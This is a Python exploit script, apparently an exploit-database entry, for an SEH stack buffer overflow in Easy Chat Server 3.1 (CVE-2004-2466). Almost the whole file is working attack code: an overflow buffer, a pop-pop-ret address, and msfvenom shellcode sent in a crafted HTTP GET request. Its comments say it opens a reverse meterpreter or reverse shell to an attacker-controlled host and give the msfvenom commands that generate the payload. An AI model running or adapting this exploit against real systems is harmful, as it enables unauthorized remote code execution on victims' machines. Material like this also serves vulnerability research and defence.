# Exploit Title: Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)
# Exploit Author: r00tpgp @ http://www.r00tpgp.com
# Usage: python easychat-exploit.py <victim-ip> <port>
# Spawns reverse meterpreter LHOST=192.168.0.162 LPORT=1990
# CVE: CVE-2004-2466
# Installer: http://www.echatserver.com/
# Tested on: Microsoft Windows 11 Pro x86-64 (10.0.22000 N/A Build 22000)

#!/usr/bin/python3

import sys
import socket
from struct import pack

host = sys.argv[1]  # Recieve IP from user
port = int(sys.argv[2])  # Recieve Port from user

junk = b"A" * 217
nseh = pack("<L", 0x06eb9090)  # short jump 6 bytes
seh = pack("<L", 0x1001ae86)  # pop pop ret 1001AE86 SSLEAY32.DLL

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.162 LPORT=1990 -f python -b "\x00\x20" -v shellcode
# Or this one is the one I used - does not use Meterpreter
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.243 LPORT=5555 -a x86 -f python -b "\x00\x20" -v shellcode --smallest

shellcode = b"\x90" * 32
#shellcode =  b""
shellcode += b"\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81"
shellcode += b"\x73\x13\x8d\x9e\x89\x1a\x83\xeb\xfc\xe2\xf4"
shellcode += b"\x71\x76\x0b\x1a\x8d\x9e\xe9\x93\x68\xaf\x49"
shellcode += b"\x7e\x06\xce\xb9\x91\xdf\x92\x02\x48\x99\x15"
shellcode += b"\xfb\x32\x82\x29\xc3\x3c\xbc\x61\x25\x26\xec"
shellcode += b"\xe2\x8b\x36\xad\x5f\x46\x17\x8c\x59\x6b\xe8"
shellcode += b"\xdf\xc9\x02\x48\x9d\x15\xc3\x26\x06\xd2\x98"
shellcode += b"\x62\x6e\xd6\x88\xcb\xdc\x15\xd0\x3a\x8c\x4d"
shellcode += b"\x02\x53\x95\x7d\xb3\x53\x06\xaa\x02\x1b\x5b"
shellcode += b"\xaf\x76\xb6\x4c\x51\x84\x1b\x4a\xa6\x69\x6f"
shellcode += b"\x7b\x9d\xf4\xe2\xb6\xe3\xad\x6f\x69\xc6\x02"
shellcode += b"\x42\xa9\x9f\x5a\x7c\x06\x92\xc2\x91\xd5\x82"
shellcode += b"\x88\xc9\x06\x9a\x02\x1b\x5d\x17\xcd\x3e\xa9"
shellcode += b"\xc5\xd2\x7b\xd4\xc4\xd8\xe5\x6d\xc1\xd6\x40"
shellcode += b"\x06\x8c\x62\x97\xd0\xf6\xba\x28\x8d\x9e\xe1"
shellcode += b"\x6d\xfe\xac\xd6\x4e\xe5\xd2\xfe\x3c\x8a\x61"
shellcode += b"\x5c\xa2\x1d\x9f\x89\x1a\xa4\x5a\xdd\x4a\xe5"
shellcode += b"\xb7\x09\x71\x8d\x61\x5c\x4a\xdd\xce\xd9\x5a"
shellcode += b"\xdd\xde\xd9\x72\x67\x91\x56\xfa\x72\x4b\x1e"
shellcode += b"\x70\x88\xf6\x49\xb2\xa0\x6d\xe1\x18\x8d\x8b"
shellcode += b"\x3a\x93\x6b\xf4\x99\x4c\xda\xf6\x10\xbf\xf9"
shellcode += b"\xff\x76\xcf\x08\x5e\xfd\x16\x72\xd0\x81\x6f"
shellcode += b"\x61\xf6\x79\xaf\x2f\xc8\x76\xcf\xe5\xfd\xe4"
shellcode += b"\x7e\x8d\x17\x6a\x4d\xda\xc9\xb8\xec\xe7\x8c"
shellcode += b"\xd0\x4c\x6f\x63\xef\xdd\xc9\xba\xb5\x1b\x8c"
shellcode += b"\x13\xcd\x3e\x9d\x58\x89\x5e\xd9\xce\xdf\x4c"
shellcode += b"\xdb\xd8\xdf\x54\xdb\xc8\xda\x4c\xe5\xe7\x45"
shellcode += b"\x25\x0b\x61\x5c\x93\x6d\xd0\xdf\x5c\x72\xae"
shellcode += b"\xe1\x12\x0a\x83\xe9\xe5\x58\x25\x79\xaf\x2f"
shellcode += b"\xc8\xe1\xbc\x18\x23\x14\xe5\x58\xa2\x8f\x66"
shellcode += b"\x87\x1e\x72\xfa\xf8\x9b\x32\x5d\x9e\xec\xe6"
shellcode += b"\x70\x8d\xcd\x76\xcf"

buffer = b"GET /chat.ghp?username=" + junk + nseh + seh + shellcode + b"&password=&room=1&sex=1 HTTP/1.1\r\n"
buffer += b"User-Agent: Mozilla/4.0\r\n"
buffer += b"Host: 192.168.1.136:80\r\n"
buffer += b"Accept-Language: en-us\r\n"
buffer += b"Accept-Encoding: gzip, deflate\r\n"
buffer += b"Referer: http://192.168.1.136\r\n"
buffer += b"Connection: Keep-Alive\r\n\r\n"

print("[*] Sending evil buffer...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buffer)
s.close()
print("[+] Done!")
